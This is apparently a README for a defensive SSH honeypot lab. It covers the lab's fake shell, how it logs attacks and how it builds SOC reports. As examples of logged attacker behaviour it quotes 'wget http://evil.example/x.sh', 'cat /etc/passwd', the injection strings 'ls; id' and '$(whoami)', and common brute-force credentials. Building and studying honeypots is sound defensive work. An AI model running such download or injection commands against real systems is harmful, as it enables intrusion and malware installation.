# Decoy Honeypot Lab — Low-Interaction SSH Honeypot

![Python](https://img.shields.io/badge/python-3.9%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Dependencies](https://img.shields.io/badge/dependencies-stdlib%20only-brightgreen)
![Tests](https://img.shields.io/badge/tests-9%20passing-brightgreen)
![MITRE](https://img.shields.io/badge/MITRE-T1110%20%7C%20T1059%20%7C%20T1078-red)

A **low-interaction SSH honeypot in pure Python (stdlib only)** that safely
attracts and logs automated SSH attacks in an isolated lab — no real shell,
no real login, no real risk to the host. It captures the exact data a SOC
analyst needs: which IPs are scanning, which credentials bots try, and what
commands they run after "login". Then it turns that raw log into a
SOC-style attacker report.

Built for blue-team learning, SOC interview prep, and threat-intel practice.

## What it is

A decoy SSH server. It listens on TCP **2222** (deliberately *not* port 22),
sends a fake OpenSSH banner, asks for a username and password, logs both,
then drops the attacker into a **fake shell** that answers a handful of
harmless commands (`ls`, `pwd`, `whoami`, `id`, `uname`…) from a hard-coded
lookup table. Anything else gets `command not found`.

Attacker input is **never executed** — no `os.system`, no `subprocess`,
no `eval`, no `exec`. There is no account to log into and no shell to
escape from. The honeypot's only job is to watch, log, and report.

## Why honeypots matter for SOC / blue team in 2026

Automated SSH brute-forcing never stopped — botnets still scan the whole
internet for port 22 and try `root/123456` millions of times a day. A
honeypot is the cheapest way to study that traffic safely:

- **Early warning** — the usernames, passwords and IPs hitting your decoy
  are the same ones hitting production. Block them before they find a
  real server.
- **TTP collection** — post-login commands (`wget …/x.sh`, `cat /etc/passwd`,
  `ps aux`) reveal attacker playbooks you can map to MITRE ATT&CK.
- **Detection engineering** — real honeypot logs are the ground truth for
  writing and tuning SIEM rules (e.g. "5 failed SSH logins from one IP
  in 60 seconds").
- **Safe practice** — junior analysts can triage real attacker behaviour
  without ever touching a production incident.

## Architecture

```
                    ┌──────────────────────────────┐
  attacker / bot    │  honeypot.py  (port 2222)    │
  ────────────────► │  fake banner → fake login →  │
                    │  fake shell (canned output)  │
                    └──────┬───────────────────────┘
                           │ logs every event
              ┌────────────┴────────────┐
              ▼                         ▼
  logs/honeypot.jsonl         logs/honeypot.db
  (JSON Lines, SIEM-ready)    (SQLite, queryable)
              │                         │
              └────────────┬────────────┘
                           ▼
                    analyze.py
              ┌────────────┴────────────┐
              ▼                         ▼
         report.html              summary.json
   (SOC attacker report,       (machine-readable
    CSS bar charts, no JS)      stats + MITRE map)
```

| Component | File | Role |
|---|---|---|
| Honeypot | `honeypot.py` | TCP listener, fake banner/login/shell, threaded |
| Logger | `src/logger.py` | JSONL + SQLite writes, per-IP stats, MITRE mapping |
| Analyzer | `analyze.py` | Reads the log, writes `report.html` + `summary.json` |
| Simulator | `simulate_attack.py` | Safe localhost brute-force demo (no internet needed) |
| Tests | `tests/test_honeypot.py` | `unittest`, 9 tests |

## Install

```bash
git clone https://github.com/<you>/decoy-honeypot.git
cd decoy-honeypot
# No dependencies — Python 3.9+ standard library only.
python3 --version
```

## Usage

**1. Start the honeypot** (terminal 1):

```bash
python3 honeypot.py
# [+] Decoy Honeypot Lab listening on 127.0.0.1:2222
# [+] Banner: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
```

Listen on all interfaces in a lab VM only: `python3 honeypot.py --host 0.0.0.0 --port 2222`

**2. Simulate an attack** (terminal 2 — localhost only, no internet):

```bash
python3 simulate_attack.py
# [+] Simulating 15 login attempts against 127.0.0.1:2222
#   [attempt] root:123456  -> logged
#   [attempt] admin:admin  -> logged
#   ...
```

**3. Generate the attacker report:**

```bash
python3 analyze.py --log logs/honeypot.jsonl --output report.html --json summary.json
# [+] Read 135 events from logs/honeypot.jsonl
# [+] Sessions: 15 | Login attempts: 15 | Commands: 90 | Unique IPs: 1
# [+] Wrote report.html and summary.json
```

Then open `report.html` in a browser. No internet needed — the charts are
plain HTML/CSS bars, no JavaScript, no external resources.

**Try it without running anything** — a pre-captured log is included:

```bash
python3 analyze.py --log logs/sample_honeypot.jsonl --output report.html --json summary.json
```

## Expected output

A raw log line (`logs/honeypot.jsonl`):

```json
{"timestamp": "2026-11-21T02:30:00+00:00", "event": "login_attempt",
 "session_id": "a1b2c3d4", "src_ip": "203.0.113.42", "src_port": 51234,
 "username": "root", "password": "123456"}
```

`summary.json` (excerpt):

```json
{
  "total_sessions": 80,
  "total_login_attempts": 129,
  "total_commands": 178,
  "unique_ips": 15,
  "top_passwords": [["123456", 31], ["admin", 15], ["oracle", 9]],
  "mitre": {
    "T1110.001": "Brute Force: Password Guessing (129 login attempts)"
  }
}
```

### Sample attacker report (from `logs/sample_honeypot.jsonl` — 80 sessions)

| Metric | Value |
|---|---|
| Sessions | 80 |
| Login attempts | 129 |
| Commands tried | 178 |
| Unique source IPs | 15 |
| Top username | `root` (34 attempts) |
| Top password | `123456` (31 attempts) |
| Most aggressive IP | `45.148.10.32` (25 attempts) |
| Most common post-login command | `wget http://evil.example/x.sh` (14× — malware download attempt) |
| MITRE ATT&CK | T1110.001 Password Guessing · T1059 Command Interpreter · T1078 Valid Accounts (0 succeeded) |

The pattern is the classic one: bots try `root/123456` first, then
`admin/admin`, then fingerprint the host (`id`, `ps aux`, `uname -a`) and
try to download a payload. None of it ever touches a real system here.

## Safety warnings

> **Run this only in an isolated lab / VM on a private network.**

- Default bind is `127.0.0.1` — it is not reachable from other machines
  unless you pass `--host 0.0.0.0`. Do that only in an isolated lab.
- **Never expose a honeypot to the internet** without understanding the
  risk: it invites attention by design, and a misconfigured host next to
  it becomes a target.
- Change the port, firewall the host, and keep the lab VM separate from
  anything that holds real data or credentials.
- The passwords in `logs/` are attacker-supplied guesses, not real
  credentials. Treat log files as untrusted data — don't paste them into
  other systems blindly.
- This is a **low-interaction** honeypot for learning and detection. It is
  not a production deception platform (see Roadmap).

## Tests

```bash
python3 -m unittest discover -s tests -v
# Ran 9 tests in ~1s — OK
```

Tests cover: the fake SSH banner, canned shell output, no shell escape
(injection strings like `ls; id` and `$(whoami)` are rejected, never run),
JSONL + SQLite logging, per-IP statistics, a full live session against a
real listener on a random localhost port, and analyzer counts / report
rendering (including "no `<script>` in the report").

## Roadmap

- [ ] HTTP honeypot (fake login page / WordPress admin) alongside SSH
- [ ] Geo-IP enrichment of source IPs (offline MaxMind DB)
- [ ] Telnet / FTP low-interaction modules
- [ ] Live dashboard + alerting (e.g. webhook on >10 attempts from one IP)
- [ ] Export to Sigma rule from observed TTPs

## License

MIT — see [LICENSE](LICENSE).
